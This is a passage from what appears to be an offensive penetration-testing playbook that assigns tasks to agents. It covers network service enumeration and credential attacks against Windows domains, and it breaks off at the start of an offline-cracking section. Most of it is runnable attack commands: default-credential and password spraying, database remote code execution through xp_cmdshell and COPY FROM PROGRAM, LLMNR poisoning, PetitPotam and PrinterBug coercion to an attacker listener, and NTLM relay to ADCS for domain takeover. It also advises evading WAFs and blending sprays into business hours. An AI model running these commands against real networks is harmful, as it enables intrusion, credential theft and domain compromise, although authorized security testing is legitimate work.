### 3.5 RDP — NLA posture & enumeration

- **Objective / hypothesis:** RDP exposed without NLA, or with weak crypto, is a brute-force and MITM surface.
- **Procedure:**
```bash
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info -iL "$SCAN_DIR/live_hosts.txt" \
  -oN "$SVC_DIR/rdp_enum.txt"
nxc rdp "$SCAN_DIR/live_hosts.txt" 2>/dev/null | tee "$SVC_DIR/nxc_rdp.txt"
# Screenshot exposed RDP login screens for context (artifacts to evidence dir)
nxc rdp "$SCAN_DIR/live_hosts.txt" --screenshot --screentime 5 2>/dev/null
```
- **Indicators:** `CredSSP/NLA: False`; domain/hostname leaked via `rdp-ntlm-info`; logged-in user shown on screenshot.
- **Validation:** NLA disabled is confirmed by the screenshot reaching a desktop/login without prior auth. NTLM info disclosure confirmed by the parsed domain name.
- **Evasion / edge cases:** Restricted Admin mode changes PtH behavior (see 6.1). RDP brute force is lockout- and detection-heavy — defer to lockout-aware spraying (4.2).
- **Severity:** Medium. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3) for info leak; higher if it enables credential attack. Business impact: pre-auth host/domain disclosure and brute-force surface.
- **Dispatch:** -> NetworkServiceAgent

### 3.6 RDP — BlueKeep & remote vulns

- **Objective / hypothesis:** Unpatched RDP is vulnerable to pre-auth RCE (CVE-2019-0708 BlueKeep) or DoS (MS12-020).
- **Procedure:**
```bash
# BlueKeep detection (safe). Exploitation is Phase 8 + sign-off only.
nmap -p3389 --script rdp-vuln-cve2019-0708 -iL "$SCAN_DIR/live_hosts.txt" -oN "$SVC_DIR/bluekeep.txt"
```
- **Indicators:** `VULNERABLE: Remote Desktop ... CVE-2019-0708`.
- **Validation:** Confirm only in a lab replica — the public BlueKeep exploit is unstable and routinely BSODs targets.
- **Evasion / edge cases:** DoS-prone: do NOT run `rdp-vuln-ms12-020` against production without written sign-off (it can crash the host). BlueKeep exploitation requires explicit authorization and a restore plan.
- **Severity:** Critical. CVSS 3.1 9.8 for BlueKeep. Business impact: wormable pre-auth RCE.
- **Dispatch:** -> ExploitDevAgent (weaponization) / NetworkServiceAgent (detection)

### 3.7 SSH — auth methods & weak credentials

- **Objective / hypothesis:** SSH exposes weak auth (password allowed, weak algos) and reusable/default credentials.
- **Procedure:**
```bash
nmap -p22 --script ssh-auth-methods,ssh2-enum-algos,sshv1 -iL "$SCAN_DIR/live_hosts.txt" \
  -oN "$SVC_DIR/ssh_enum.txt"
nxc ssh "$SCAN_DIR/live_hosts.txt" 2>/dev/null | tee "$SVC_DIR/nxc_ssh.txt"
# Default/weak creds (lockout-aware; small high-signal list, low thread count)
nxc ssh "$SCAN_DIR/live_hosts.txt" -u root,admin,user,oracle,git,ubuntu \
  -p 'root,admin,password,toor,changeme,Password1' --no-bruteforce --continue-on-success \
  | tee "$RUN_DIR/creds/ssh_default.txt"
```
- **Indicators:** `password` in auth methods (vs. publickey-only); weak KEX/MAC; a `[+]` login from the default-cred pass.
- **Validation:** Confirm a hit by opening an interactive session and running `id; hostname` (artifacts to evidence dir).
- **Evasion / edge cases:** `--no-bruteforce` pairs the i-th user with the i-th password (no cartesian explosion) — safe against lockouts. Key-based auth ignores password sprays. Throttle `-t 4` and add jitter where fail2ban is likely.
- **Severity:** Default creds -> High/Critical (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, 9.8 if root). Weak algos -> Low. Business impact: direct shell foothold and pivot.
- **Dispatch:** -> NetworkServiceAgent

### 3.8 SNMP — communities & write access

- **Objective / hypothesis:** Default/guessable SNMP communities leak system, route, and process data; RW communities allow config change.
- **Procedure:**
```bash
# Discover communities (read)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i "$SCAN_DIR/live_hosts.txt" \
  | tee "$SVC_DIR/snmp_communities.txt"
# Bulk-walk discovered hosts/communities
for line in $(grep -oP '\[\K[^\]]+' "$SVC_DIR/snmp_communities.txt"); do :; done
snmpwalk -v2c -c public "$TARGET_HOST" | tee "$SVC_DIR/snmpwalk_${TARGET_HOST}.txt"
# Extended MIB pulls (users, processes, software, listening ports)
snmp-check "$TARGET_HOST" -c public | tee "$SVC_DIR/snmpcheck_${TARGET_HOST}.txt"
# Test for WRITE access (do not modify config — just confirm writability on a benign OID)
snmpset -v2c -c private "$TARGET_HOST" sysContact.0 s "audit-readonly-test" 2>&1 \
  | tee "$SVC_DIR/snmp_write_test.txt"
```
- **Indicators:** Valid community returns a populated walk; `snmp-check` lists local users/processes; `snmpset` succeeds = RW community.
- **Validation:** RW confirmed only if the value actually changes and is read back; immediately restore the original value. On Cisco, RW SNMP can exfil the running-config via TFTP — note as impact, do not execute without sign-off.
- **Evasion / edge cases:** SNMPv3 needs creds (try discovered ones). UDP loss causes false negatives — retry. Writing config is a change action; default to read-only proof.
- **Severity:** RO -> Medium (info disclosure, 5.3); RW -> High/Critical (`C:H/I:H/A:H`). Business impact: device takeover, config theft, credential leakage from MIBs.
- **Dispatch:** -> NetworkServiceAgent

### 3.9 SMTP — user enumeration & open relay

- **Objective / hypothesis:** SMTP allows username enumeration (VRFY/EXPN/RCPT) and may relay mail for arbitrary senders.
- **Procedure:**
```bash
nmap -p25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay -iL "$SCAN_DIR/live_hosts.txt" \
  -oN "$SVC_DIR/smtp_enum.txt"
# Targeted user enumeration
smtp-user-enum -M RCPT -U "$RUN_DIR/creds/domain_users.txt" -t "$TARGET_HOST" \
  | tee "$SVC_DIR/smtp_userenum.txt"
# Manual open-relay confirmation (route through Burp not applicable — capture in pcap)
swaks --to test@external.example --from spoofed@target.com --server "$TARGET_HOST" --header "Subject: relay-test" \
  | tee "$SVC_DIR/smtp_relay_test.txt"
```
- **Indicators:** Differential responses to valid vs invalid users (250 vs 550); `smtp-open-relay: VULNERABLE`; `swaks` accepts external->external.
- **Validation:** Confirm relay by receiving the test mail at an attacker-controlled inbox; confirm user-enum by matching against the known user list.
- **Evasion / edge cases:** Rate-limited greylisting causes false negatives — slow down. RCPT-based enum is stealthier than VRFY/EXPN (often disabled). Open relay testing must use benign content to an inbox you control.
- **Severity:** User-enum -> Medium (5.3); open relay -> Medium-High (phishing/spam abuse, reputational). Business impact: target-validated username list seeds spraying; relay enables spoofed phishing.
- **Dispatch:** -> NetworkServiceAgent

### 3.10 LDAP — anonymous bind enumeration

- **Objective / hypothesis:** Anonymous LDAP bind discloses the directory (users, groups, descriptions with passwords, computer objects).
- **Procedure:**
```bash
# Root DSE / naming contexts (anonymous)
ldapsearch -x -H "ldap://$TARGET_DC" -s base -b "" namingContexts defaultNamingContext \
  | tee "$SVC_DIR/ldap_rootdse_anon.txt"
# Anonymous object dump (if permitted)
ldapsearch -x -H "ldap://$TARGET_DC" -b "$DOMAIN_DN" "(objectClass=user)" \
  sAMAccountName description memberOf userAccountControl | tee "$SVC_DIR/ldap_anon_users.txt"
# Structured anonymous dump
ldapdomaindump "$TARGET_DC" --no-json -o "$SVC_DIR/ldapdomaindump_anon/" 2>/dev/null || true
# Mine descriptions for cleartext passwords
grep -iP 'description:.*(pass|pwd|cred)' "$SVC_DIR/ldap_anon_users.txt" \
  | tee "$LOOT_DIR/ldap_description_secrets.txt"
```
- **Indicators:** Anonymous bind returns objects (many hardened DCs deny this); passwords in `description` fields; `userAccountControl` flags (DONT_REQ_PREAUTH, TRUSTED_FOR_DELEGATION).
- **Validation:** Confirm anonymous (no `-D`/`-w`) returned real attributes, not just root DSE. Validate any description password via spraying (4.2).
- **Evasion / edge cases:** LDAPS (636) may permit anon when LDAP (389) does not. If anon is denied, defer the full dump to authenticated AD enumeration (5.1). UAC flag parsing feeds Kerberos attacks (5.3/5.4).
- **Severity:** Medium-High. CVSS 3.1 7.5 for directory disclosure; Critical if descriptions hold creds. Business impact: full org chart + delegation/pre-auth flags + sometimes passwords, all unauthenticated.
- **Dispatch:** -> ActiveDirectoryAgent

### 3.11 NFS & rsync — exposure

- **Objective / hypothesis:** Exported NFS shares (no_root_squash) and open rsync modules allow file read/write and privesc.
- **Procedure:**
```bash
# NFS exports
showmount -e "$TARGET_HOST" | tee "$SVC_DIR/nfs_exports_${TARGET_HOST}.txt"
nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs -iL "$SCAN_DIR/live_hosts.txt" \
  -oN "$SVC_DIR/nfs_enum.txt"
# Mount and inspect (read-only proof)
mkdir -p /mnt/nfs_audit && mount -t nfs -o vers=3,nolock "$TARGET_HOST:/export" /mnt/nfs_audit && ls -la /mnt/nfs_audit
# rsync module listing
rsync --list-only "rsync://$TARGET_HOST/" | tee "$SVC_DIR/rsync_modules.txt"
rsync --list-only "rsync://$TARGET_HOST/<module>/" | tee "$SVC_DIR/rsync_${TARGET_HOST}.txt"
```
- **Indicators:** World-readable exports; `no_root_squash` (write a SUID binary as root -> privesc); anonymous rsync modules with read/write.
- **Validation:** Confirm read by listing files; for `no_root_squash` privesc, prove writability by touching a file as root in a lab, do not plant a SUID on production without sign-off.
- **Evasion / edge cases:** Root-squash blocks root-file abuse but data read may still apply. rsync over SSH (873 vs SSH) differs — check both. NFSv4 ID mapping changes UID semantics.
- **Severity:** High. `no_root_squash` -> `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8 local-root via remote write). Business impact: data exposure and root compromise of the file server.
- **Dispatch:** -> NetworkServiceAgent

### 3.12 FTP & TFTP — enumeration

- **Objective / hypothesis:** Anonymous FTP and open TFTP expose files (configs, backups) and sometimes write access.
- **Procedure:**
```bash
nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst -iL "$SCAN_DIR/live_hosts.txt" -oN "$SVC_DIR/ftp_enum.txt"
nxc ftp "$SCAN_DIR/live_hosts.txt" -u anonymous -p anonymous 2>/dev/null | tee "$SVC_DIR/nxc_ftp.txt"
# TFTP (UDP/69) — try to grab common device config filenames
for f in running-config startup-config conf.txt; do
  tftp "$TARGET_HOST" -c get "$f" "$LOOT_DIR/tftp_${TARGET_HOST}_${f}" 2>/dev/null
done
```
- **Indicators:** `Anonymous FTP login allowed`; writable FTP root; TFTP returns a device config.
- **Validation:** Download a listed file to confirm read; test write with a benign uploaded marker, then remove it.
- **Evasion / edge cases:** TFTP has no listing — you must guess filenames (device-specific lists help). FTP bounce is mostly historical but flag if present. Cleartext FTP creds are sniffable (note in report).
- **Severity:** Medium; writable FTP serving a webroot -> High/RCE. Business impact: config/backup exposure, potential webshell drop.
- **Dispatch:** -> NetworkServiceAgent

### 3.13 MSSQL — profiling & xp_cmdshell RCE

- **Objective / hypothesis:** MSSQL with weak/empty `sa`, or a captured login, yields command execution via `xp_cmdshell` and AD lateral movement via links/impersonation.
- **Procedure:**
```bash
nmap -p1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password -iL "$SCAN_DIR/live_hosts.txt" \
  -oN "$SVC_DIR/mssql_enum.txt"
# Weak/empty creds and Windows-auth via captured identity
nxc mssql "$SCAN_DIR/db_targets.txt" -u sa -p '' 2>/dev/null | tee "$SVC_DIR/mssql_sa.txt"
nxc mssql "$SCAN_DIR/db_targets.txt" -u "$LP_USER" -p "$LP_PASS" -d "$DOMAIN" 2>/dev/null | tee "$SVC_DIR/mssql_winauth.txt"
# Interactive: enable + run xp_cmdshell (only after a confirmed privileged login)
impacket-mssqlclient "$DOMAIN/$LP_USER:$LP_PASS@$TARGET_HOST" -windows-auth <<'SQL'
enable_xp_cmdshell
xp_cmdshell whoami
SQL
# Enumerate linked servers for lateral SQL exec
nxc mssql "$TARGET_HOST" -u "$LP_USER" -p "$LP_PASS" -d "$DOMAIN" -M mssql_priv 2>/dev/null
```
- **Indicators:** Login success; `xp_cmdshell` returns command output; linked servers / `sysadmin` membership; `EXECUTE AS` impersonation available.
- **Validation:** RCE confirmed by `whoami`/`hostname` output captured to evidence; disable `xp_cmdshell` again if you enabled it (restore state).
- **Evasion / edge cases:** If `xp_cmdshell` is locked, try `sp_OACreate`, CLR assembly, or `xp_dirtree` UNC to coerce the service account's NetNTLM hash (relay/crack, ties to 4.4/4.5). MSSQL service often runs as a domain account -> Kerberoast (5.2).
- **Severity:** Critical. CVSS 3.1 `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` (~9.1) or 9.8 if empty `sa`. Business impact: host RCE as the SQL service account, often a path to DA.
- **Dispatch:** -> NetworkServiceAgent

### 3.14 PostgreSQL — profiling & COPY PROGRAM RCE

- **Objective / hypothesis:** PostgreSQL with weak creds and superuser yields command execution via `COPY ... FROM PROGRAM` (or large-object/extension tricks).
- **Procedure:**
```bash
nmap -p5432 --script pgsql-brute -iL "$SCAN_DIR/db_targets.txt" -oN "$SVC_DIR/pgsql_enum.txt"
nxc postgres "$SCAN_DIR/db_targets.txt" -u postgres -p 'postgres,password,' 2>/dev/null \
  | tee "$SVC_DIR/pgsql_creds.txt"
# COPY FROM PROGRAM RCE (PostgreSQL >= 9.3, superuser)
psql "postgresql://postgres:postgres@$TARGET_HOST/postgres" <<'SQL'
DROP TABLE IF EXISTS cmd_out; CREATE TABLE cmd_out(line text);
COPY cmd_out FROM PROGRAM 'id; hostname';
SELECT * FROM cmd_out;
SQL
```
- **Indicators:** Auth success; `COPY FROM PROGRAM` returns command output rows.
- **Validation:** RCE confirmed by output capture; drop the scratch table afterward (restore state).
- **Evasion / edge cases:** Non-superuser cannot `COPY PROGRAM` — check `\du` for roles; CVE-2019-9193 affects default-superuser pre-restriction versions. Untrusted PL/Python/PL/Perl is an alternate path if installed.
- **Severity:** Critical. CVSS 3.1 ~9.8 (empty/weak superuser) to 8.8. Business impact: host RCE as the postgres service account.
- **Dispatch:** -> NetworkServiceAgent

### 3.15 MySQL / MariaDB — profiling

- **Objective / hypothesis:** Weak/empty MySQL creds expose data and, with FILE priv, file read/write (UDF RCE).
- **Procedure:**
```bash
nmap -p3306 --script mysql-info,mysql-empty-password,mysql-users,mysql-databases -iL "$SCAN_DIR/db_targets.txt" \
  -oN "$SVC_DIR/mysql_enum.txt"
nxc mysql "$SCAN_DIR/db_targets.txt" -u root -p 'root,password,' 2>/dev/null | tee "$SVC_DIR/mysql_creds.txt"
# With FILE privilege: read a sensitive file (proof), or UDF for RCE (lab/sign-off)
mysql -h "$TARGET_HOST" -uroot -p'' -e "SELECT LOAD_FILE('/etc/passwd');"
```
- **Indicators:** Empty-password root; `FILE` grant; readable secret via `LOAD_FILE`.
- **Validation:** Confirm read by retrieving a known file; UDF RCE only in lab unless explicitly authorized.
- **Evasion / edge cases:** `secure_file_priv` restricts file ops. Bind-address often localhost — exposed 3306 is the anomaly worth flagging.
- **Severity:** High-Critical (empty root 9.8). Business impact: data exposure, file read, potential RCE.
- **Dispatch:** -> NetworkServiceAgent

### 3.16 MongoDB — exposure

- **Objective / hypothesis:** Unauthenticated MongoDB exposes/permits modification of all databases.
- **Procedure:**
```bash
nmap -p27017 --script mongodb-info,mongodb-databases -iL "$SCAN_DIR/db_targets.txt" -oN "$SVC_DIR/mongo_enum.txt"
mongosh "mongodb://$TARGET_HOST:27017" --eval 'db.adminCommand({listDatabases:1})' 2>/dev/null \
  | tee "$SVC_DIR/mongo_dbs.txt"
```
- **Indicators:** `listDatabases` succeeds without auth; collections enumerable.
- **Validation:** Confirm by reading one document count; do not exfiltrate beyond a proof sample per data-handling rules.
- **Evasion / edge cases:** Newer Mongo binds localhost by default — an exposed instance is the misconfig. Auth-enabled instances need creds (try discovered ones).
- **Severity:** High-Critical. CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) for full unauth read/write. Business impact: total data breach.
- **Dispatch:** -> NetworkServiceAgent

### 3.17 Redis — exposure & RCE

- **Objective / hypothesis:** Unauthenticated Redis allows data access and RCE (cron/SSH-key write, module load, RDB webshell).
- **Procedure:**
```bash
redis-cli -h "$TARGET_HOST" ping            # PONG without AUTH = exposed
redis-cli -h "$TARGET_HOST" info server | tee "$SVC_DIR/redis_info.txt"
nmap -p6379 --script redis-info -iL "$SCAN_DIR/db_targets.txt" -oN "$SVC_DIR/redis_enum.txt"
# RCE proof-of-concept (lab/sign-off): write an authorized_keys via RDB dump path
# redis-cli -h $TARGET_HOST config get dir; config get dbfilename   # confirm writable path first
```
- **Indicators:** `PONG` with no auth; `config get dir` writable; `redis_version` mapping to module-load RCE (>=4.0).
- **Validation:** Confirm RCE only in lab or with sign-off; the read of `INFO` and a key sample is sufficient to prove unauth exposure.
- **Evasion / edge cases:** `protected-mode yes` blocks remote when no bind/pass — exposed means misconfigured. Module-load and SSH-key write are intrusive/persistent — gate behind authorization.
- **Severity:** Critical. CVSS 3.1 9.8 (unauth RCE potential). Business impact: cache data theft and host takeover.
- **Dispatch:** -> NetworkServiceAgent

### 3.18 Network printers — PRET & data abuse

- **Objective / hypothesis:** Network printers (9100/JetDirect, 631/IPP, 515/LPD) leak stored credentials, allow filesystem access (PJL/PostScript), and capture print jobs.
- **Procedure:**
```bash
nmap -p9100,515,631 --script pjl-ready-message -iL "$SCAN_DIR/live_hosts.txt" -oN "$SVC_DIR/printer_enum.txt"
# PRET — PostScript/PJL/PCL abuse (filesystem, NVRAM, credential disclosure)
python3 pret.py "$TARGET_HOST" pjl <<'PRET'
info config
fsdirlist /
PRET
# Web admin UI of the printer goes through Burp with a browser UA (often has stored SMTP/LDAP creds)
curl -sk -A "$UA" -x "$BURP_PROXY" "http://$TARGET_HOST/" -o "$LOOT_DIR/printer_web_${TARGET_HOST}.html"
```
- **Indicators:** PJL `info config` returns settings; filesystem listing succeeds; printer admin UI stores LDAP/SMTP bind creds in cleartext or recoverable form.
- **Validation:** Confirm credential disclosure by retrieving the stored LDAP/SMTP password (printers frequently hold a domain service account). Validate that account via spraying (4.2).
- **Evasion / edge cases:** PJL/PostScript filesystem access varies by vendor. Avoid the PostScript infinite-loop / NVRAM-reset commands (DoS-prone) without sign-off. Pass-back attacks (point the printer's LDAP at your listener) capture the bind cred — coordinate with 4.3.
- **Severity:** Medium-High. CVSS 3.1 up to 8.8 when a domain service account is recovered. Business impact: printers are a quiet, under-monitored source of domain credentials.
- **Dispatch:** -> NetworkServiceAgent

### 3.19 Appliance CVE triage (Citrix/Fortinet/PAN/Exchange/etc.)

- **Objective / hypothesis:** Edge/management appliances run known, exploitable CVEs (often pre-auth RCE) that are the fastest path into the network.
- **Procedure:**
```bash
# Fingerprint and CVE-scan HTTP appliances THROUGH Burp with a browser UA
httpx -l "$SCAN_DIR/web_targets.txt" -title -tech-detect -status-code -json \
  -H "User-Agent: $UA" -http-proxy "$BURP_PROXY" -o "$SVC_DIR/appliance_fp.json"
nuclei -l "$SCAN_DIR/web_targets.txt" -tags cve,citrix,fortinet,panos,exchange,vpn,default-login \
  -severity critical,high -H "User-Agent: $UA" -proxy "$BURP_PROXY" \
  -o "$SVC_DIR/nuclei_appliances.txt"
# Correlate discovered versions to exploits (detection, not execution)
for s in $(grep -oP '\d+/tcp.*' "$SVC_DIR"/ver_*.nmap | awk '{print $3,$4,$5}' | sort -u); do
  searchsploit "$s" --exclude=dos
done | tee "$SVC_DIR/searchsploit_appliances.txt"
```
- **Indicators:** Nuclei `[critical]` hits (e.g. Citrix Bleed, Fortinet SSL-VPN path traversal, PAN-OS, ProxyShell); version banners matching public PoCs.
- **Validation:** Verify a non-destructive PoC indicator through Burp (e.g. a read-only path traversal returning a known file) before declaring exploitable; full exploitation goes to Phase 8.
- **Evasion / edge cases:** Browser UA + Burp keeps appliance WAFs from instantly flagging scanner UAs and gives a captured artifact for every request. Many appliance PoCs are destructive (config write) — detection-only here, weaponize with sign-off.
- **Severity:** Critical. Most edge-appliance RCEs are CVSS 9.8. Business impact: pre-auth entry to the internal network from the perimeter.
- **Dispatch:** -> ExploitDevAgent (weaponization) / NetworkServiceAgent (detection)

**Phase artifacts:** `services/*` (per-service enum + vuln output), `loot/*` (share/printer/db loot candidates), `relay/relay_targets.txt`, `creds/{domain_users,ssh_default,...}.txt`, `pcap/*`.

**Gate-out:** Every detected service profiled; unauth wins captured; relay list built; appliance CVEs triaged.
```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase services --status completed \
  --findings "$RUN_DIR/findings/phase3-services.json"
```

---

## Phase 4: CREDENTIAL ATTACKS

**Owner:** NetworkServiceAgent (`services`) for service/default creds; ActiveDirectoryAgent (`directory`) for domain-wide spraying and coercion. · **Parallelizable:** default-cred testing per service is parallel; domain spraying is serialized by lockout policy.

**Objective & expert rationale.** Acquire the first credential, then expand. The expert sequence is: harvest usernames (Phase 3), read the lockout policy, spray conservatively, and in parallel poison/coerce/relay to land NTLM material without ever guessing a password. Spraying is the loudest, most damaging-if-careless step in the whole engagement — it is gated by the lockout policy and logged attempt-by-attempt.

**Gate-in.** Username list present (`creds/domain_users.txt`); lockout policy read.

### 4.1 Default & weak credentials (per service)

- **Objective / hypothesis:** Services and appliances run with vendor-default or trivially weak credentials.
- **Procedure:**
```bash
# NetExec across protocols with a paired (non-cartesian) default list — lockout-safe
nxc smb   "$SCAN_DIR/live_hosts.txt" -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -p /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt --no-bruteforce --continue-on-success \
  | tee "$RUN_DIR/creds/default_smb.txt"
nxc winrm "$SCAN_DIR/live_hosts.txt" -u administrator -p 'Password1,Welcome1,Passw0rd' --no-bruteforce --continue-on-success
nxc mssql "$SCAN_DIR/db_targets.txt" -u sa -p '' --continue-on-success
nxc rdp   "$SCAN_DIR/live_hosts.txt" -u administrator -p 'Password1' --no-bruteforce --continue-on-success
# Appliance/web management default-login via Burp
nuclei -l "$SCAN_DIR/web_targets.txt" -tags default-login -H "User-Agent: $UA" -proxy "$BURP_PROXY" \
  -o "$RUN_DIR/creds/default_web.txt"
```
- **Indicators:** A `[+]` (NetExec) on any protocol; nuclei `default-login` hit.
- **Validation:** Re-authenticate with the found credential in a fresh session and capture proof; store the credential in the vault under a per-host slug.
- **Evasion / edge cases:** `--no-bruteforce` enforces 1:1 user:pass pairing so a default list never multiplies into a lockout sweep. Local-auth defaults need `--local-auth`.
- **Severity:** High-Critical depending on the account (`administrator`/`sa` -> 9.8). Business impact: immediate authenticated foothold.
- **Dispatch:** -> NetworkServiceAgent

### 4.2 Lockout-aware password spraying

- **Objective / hypothesis:** A small set of seasonal/company passwords unlocks at least one domain account, without tripping lockouts.
- **Procedure:**
```bash
# 0) Fold recon-sourced username/email seeds into the spray list (from W_RECON leaks/emails.txt)
RECON_DIR="$RUN_DIR/recon"
[ -s "$RECON_DIR/leaks/emails.txt" ] && sed 's/@.*//' "$RECON_DIR/leaks/emails.txt" \
  | sort -u >> "$RUN_DIR/creds/domain_users.txt"
sort -u "$RUN_DIR/creds/domain_users.txt" -o "$RUN_DIR/creds/domain_users.txt"
# 1) Read the policy FIRST (authoritatively)
nxc smb "$TARGET_DC" -u '' -p '' --pass-pol | tee "$RUN_DIR/creds/lockout_policy.txt"
# Parse threshold + observation window; safe_attempts = threshold - 1 per window (default to 1 if unknown)
THRESHOLD=$(grep -oiP 'lockout threshold:\s*\K\d+' "$RUN_DIR/creds/lockout_policy.txt" || echo 0)
WINDOW_MIN=$(grep -oiP 'reset.*:\s*\K\d+' "$RUN_DIR/creds/lockout_policy.txt" || echo 30)
echo "[*] threshold=$THRESHOLD window=${WINDOW_MIN}m -> 1 spray per window, jittered"

# 2) Kerberos pre-auth spray (quieter, no SMB session) — ONE password, then wait a full window
kerbrute passwordspray -d "$DOMAIN" --dc "$TARGET_DC" "$RUN_DIR/creds/domain_users.txt" 'Spring2026!' \
  -o "$RUN_DIR/creds/spray_kerbrute.txt"
sleep $(( WINDOW_MIN * 60 + 60 ))

# 3) SMB spray as fallback, also one password per window
nxc smb "$TARGET_DC" -u "$RUN_DIR/creds/domain_users.txt" -p 'Welcome2026!' --continue-on-success \
  | tee -a "$RUN_DIR/creds/spray_smb.txt"

# 4) Track bad-pwd-count to avoid locking accounts (read after a spray)
nxc ldap "$TARGET_DC" -u "$LP_USER" -p "$LP_PASS" --query "(badPwdCount>=1)" "samaccountname badpwdcount" 2>/dev/null
```
- **Indicators:** A `[+] DOMAIN\user:password` line; kerbrute `VALID LOGIN`.
- **Validation:** Confirm the hit with `nxc smb $TARGET_DC -u user -p 'pass'` once, then stop spraying that account; store in vault.
- **Evasion / edge cases:** NEVER exceed `threshold - 1` attempts per observation window across the whole user set; account for failed logins the org generates itself by leaving margin (threshold - 2). Spray during business hours to blend in. Exclude already-locked and honeypot/canary accounts (often named to attract sprayers). Smart lockout (Azure-hybrid) may not reflect in on-prem policy — be extra conservative.
- **Severity:** Critical (enabler). A single sprayed credential typically unlocks the entire AD attack graph. Business impact: domain foothold; mis-run spraying causes mass account lockout (availability incident).
- **Dispatch:** -> ActiveDirectoryAgent

### 4.3 NTLM hash capture (poisoning)

- **Objective / hypothesis:** LLMNR/NBT-NS/mDNS poisoning and IPv6 DHCP spoofing capture NetNTLM hashes from misdirected authentications.
- **Procedure:**
```bash
# LLMNR/NBT-NS/mDNS poisoning (Analyze first to confirm chatter without responding)
sudo responder -I "$IFACE" -A | tee "$RUN_DIR/creds/responder_analyze.txt"   # passive
sudo responder -I "$IFACE" -wv | tee "$RUN_DIR/creds/responder.txt"          # active capture
# IPv6 DNS takeover (mitm6) — pairs with relay (4.5)
sudo mitm6 -d "$DOMAIN" | tee "$RUN_DIR/creds/mitm6.txt" &
# Captured hashes accumulate in Responder's logs
cp /usr/share/responder/logs/*NTLMv2* "$RUN_DIR/creds/" 2>/dev/null
```
- **Indicators:** `[SMB] NTLMv2-SSP Hash` lines; mitm6 winning name resolution for a client.
- **Validation:** Crack offline (4.6) or relay live (4.5). A captured hash that cracks/relays proves the exposure.
- **Evasion / edge cases:** In Analyze mode Responder only observes (zero injection) — use it to justify active poisoning in monitored environments. Disable Responder's SMB/HTTP servers when relaying (ntlmrelayx needs those ports). mitm6 is disruptive to IPv6 clients — scope and time-box it.
- **Severity:** High. Capturing a privileged NetNTLMv2 -> crack/relay -> code exec. Business impact: passive-looking attack yields active credentials.
- **Dispatch:** -> ActiveDirectoryAgent

### 4.4 Authentication coercion (PetitPotam / Coercer / PrinterBug)

- **Objective / hypothesis:** A low-priv (or anonymous) account can force a target (often a DC) to authenticate to an attacker host, yielding its machine-account NetNTLM for relay.
- **Procedure:**
```bash
# Multi-method coercion (PetitPotam MS-EFSR, PrinterBug MS-RPRN, DFSCoerce, ShadowCoerce, MS-EVEN)
coercer coerce -u "$LP_USER" -p "$LP_PASS" -d "$DOMAIN" -t "$TARGET_DC" -l "$LISTENER_IP" \
  --filter-method-name "EfsRpc|RpcRemote|NetrDfs" | tee "$RUN_DIR/relay/coercer.txt"
# PetitPotam (MS-EFSRPC) — often works unauthenticated on unpatched DCs
python3 PetitPotam.py -d "$DOMAIN" -u "$LP_USER" -p "$LP_PASS" "$LISTENER_IP" "$TARGET_DC"
# PrinterBug (MS-RPRN)
python3 printerbug.py "$DOMAIN/$LP_USER:$LP_PASS@$TARGET_DC" "$LISTENER_IP"
```
- **Indicators:** Inbound SMB/HTTP authentication from the coerced host appears at your listener (Responder/ntlmrelayx logs the `MACHINE$` account).
- **Validation:** Confirmed when the relay (4.5) lands a session as the coerced machine account, or Responder logs the machine hash.
- **Evasion / edge cases:** PetitPotam pre-auth path is patched on current DCs — fall back to authenticated `EfsRpcOpenFileRaw`/other methods via Coercer. Coercion + ADCS ESC8 relay (5.8) is the classic instant-DA chain. Ensure the coerced auth lands on YOUR listener and stays in scope.
- **Severity:** Critical (as a chain link). Coerced DC auth relayed to ADCS/LDAP = domain compromise. Business impact: forces privileged authentication on demand.
- **Dispatch:** -> ActiveDirectoryAgent

### 4.5 NTLM relay execution (SMB / LDAP / ADCS)

- **Objective / hypothesis:** Captured/coerced NTLM auth can be relayed to a service that lacks signing/channel-binding, yielding code execution, RBCD, shadow creds, or certificates.
- **Procedure:**
```bash
# Relay to SMB (signing-disabled targets) for command execution / SAM dump
impacket-ntlmrelayx -tf "$RUN_DIR/relay/relay_targets.txt" -smb2support -socks \
  | tee "$RUN_DIR/relay/relay_smb.txt"
# Relay to LDAPS for RBCD or Shadow Credentials (no LDAP signing/CB enforced)
impacket-ntlmrelayx -t "ldaps://$TARGET_DC" --delegate-access --escalate-user "$LP_USER" \
  | tee "$RUN_DIR/relay/relay_ldap.txt"
# Relay to ADCS web enrollment (ESC8) for a DC/user certificate — HTTP target, browser-UA aware
impacket-ntlmrelayx -t "http://$CA_HOST/certsrv/certfnsh.asp" --adcs --template DomainController \
  | tee "$RUN_DIR/relay/relay_adcs.txt"
```
- **Indicators:** ntlmrelayx prints `Authenticating against ... SUCCEED`; SOCKS session available; LDAP delegation written; ADCS returns a base64 PFX.
- **Validation:** For SMB, run a command through the SOCKS session; for LDAP RBCD, complete the S4U (5.6); for ADCS, authenticate with the issued cert (5.8) — proof is the resulting privileged action.
- **Evasion / edge cases:** SMB signing and LDAP channel binding (the post-2023 hardening) block their respective relays — that is exactly why 3.2 builds the relay list and 5.8 prefers ESC8 over LDAP. Cross-protocol relay (HTTP->LDAP) bypasses SMB signing entirely.
- **Severity:** Critical. CVSS 3.1 up to 9.8 (coerced-DC -> ADCS -> DA). Business impact: privileged code execution / certificate-based domain takeover with no password ever guessed.
- **Dispatch:** -> ActiveDirectoryAgent

### 4.6 Offline cracking & targeted brute force

- **Objective / hypothesis:** Captured NetNTLM/Kerberos hashes crack to cleartext; specific high-value accounts justify targeted brute force.
- **Procedure:**
```bash
# Crack NetNTLMv2
